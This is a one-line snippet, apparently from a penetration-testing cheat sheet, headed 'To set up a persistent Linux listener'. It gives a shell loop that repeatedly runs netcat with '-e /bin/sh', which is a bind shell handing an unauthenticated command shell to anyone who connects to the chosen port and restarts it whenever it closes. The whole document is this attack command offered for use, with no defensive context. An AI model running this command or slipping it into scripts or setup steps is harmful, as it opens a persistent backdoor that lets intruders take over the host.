#### To set up a persistent Linux listener
```
while [ 1 ]; do echo "Started"; nc -lnp [port] -e /bin/sh; done
```